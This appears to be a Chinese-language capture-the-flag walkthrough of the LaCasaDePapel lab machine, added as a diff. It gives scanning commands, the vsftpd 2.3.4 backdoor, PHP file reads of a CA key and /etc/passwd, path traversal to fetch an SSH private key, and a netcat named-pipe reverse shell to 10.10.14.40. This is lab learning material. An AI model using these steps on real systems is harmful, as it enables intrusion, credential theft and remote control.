@@ -1,0 +1,48 @@
+nmap -sV -sC -Pn 10.129.140.3 > nmap.txt
+nmap --script vuln -sV -p 21,22,80,443 10.129.140.3 > nmapvuln.txt
+
+src="/qrcode?qrurl=otpauth://hotp/Token?secret=NMZU6YLMEYYGSYJBJYSHQLB7LNHCGQKJ&algorithm=SHA1"
+
+
+
+
+gobuster dir  -u http://LaCasaDePapel.htb  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterhttp.txt
+gobuster dir  -u https://LaCasaDePapel.htb  -w /usr/share/dirb/wordlists/common.txt -x txt,php,cgi > gobusterhttps.txt
+
+1.nmap發現21port的vsftpd 2.3.4,根據版本號搜索漏洞可以發現有backdoor漏洞,只要在USER地方輸入:)就會啟動後門
+2.登入6200port可以值部份php指令
+scandir('/home/nairobi')
+file_get_contents('/home/nairobi/ca.key')
+file_get_contents('/etc/passwd')
+3.查看ca.key與網站上證書是否為同個公私鑰
+openssl pkey -in nairobi_ca.key -pubout
+openssl x509 -in lacasadepapel-htb.pem -pubkey -noout
+4.生成證書client key
+openssl genrsa -out client.key 4096
+openssl req -new -key client.key -out client.csr
+openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
+5.在firefox的your certifacate import client.p12
+6.在firefox的autenticate import client.csr
+7.https驗證證書後可以查看到頁面檔案
+https://lacasadepapel.htb/?path=..
+8.嘗試點擊下載檔案,發現下載請求地址是這樣
+https://lacasadepapel.htb//file/U0VBU09OLTEvMDIuYXZp
+9.將字串base64解密發現是路徑
+echo U0VBU09OLTEvMDIuYXZp |base64 -d
+10.生成密鑰的base64字串,必須要加-n不然會有換行,造成被封鎖
+echo -n ../.ssh/id_rsa |base64
+11.下載私鑰匙
+https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=
+13.查看home下用戶
+https://lacasadepapel.htb/?path=../../
+berlin
+dali
+nairobi
+oslo
+professor
+14.嘗試ssh登入所有用戶登入prodessor可以登錄
+bash -c 'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 4444 >/tmp/f'
+15.發現professor下面有memcached.ini檔案,修改command取得reverse shell
+
+
+
